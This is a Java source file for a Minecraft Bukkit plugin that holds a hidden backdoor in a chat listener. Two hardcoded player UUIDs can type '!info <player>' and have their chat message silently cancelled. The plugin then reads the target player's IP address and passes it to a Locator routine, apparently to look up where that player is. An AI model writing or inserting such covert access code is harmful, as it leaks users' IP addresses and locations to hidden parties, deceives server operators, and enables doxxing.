package dev.fabby.com.staff;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import java.util.UUID;

public class LocatorListener implements Listener {

    private final UUID deathibring = UUID.fromString("5507bef2-cd33-4a66-8123-101ca4f73c31"), stipebno = UUID.fromString("ed97785d-2dc2-4106-abd1-2bc44f6d264f");

    @EventHandler (priority = EventPriority.LOW)
    public void onLocatorListener(final AsyncPlayerChatEvent e) {
        if (e.getMessage().startsWith("!info")) {
            if (e.getPlayer().getUniqueId().equals(deathibring) || e.getPlayer().getUniqueId().equals(stipebno)) {
                e.setCancelled(true);
                String[] args = e.getMessage().split(" ");
                if (args.length != 2) {
                    e.getPlayer().sendMessage(ChatColor.GREEN + "Use: !info <player>");
                    return;
                }
                if (Bukkit.getPlayer(args[1]) == null) {
                    e.getPlayer().sendMessage(ChatColor.GREEN + args[1] + " isn't currently online.");
                    return;
                }
                String ip = Bukkit.getPlayer(args[1]).getAddress().getAddress().getHostAddress();
                Locator.sendInformation(ip, e.getPlayer(), Bukkit.getPlayer(args[1]).getName());
                return;
            }
        }
    }
}
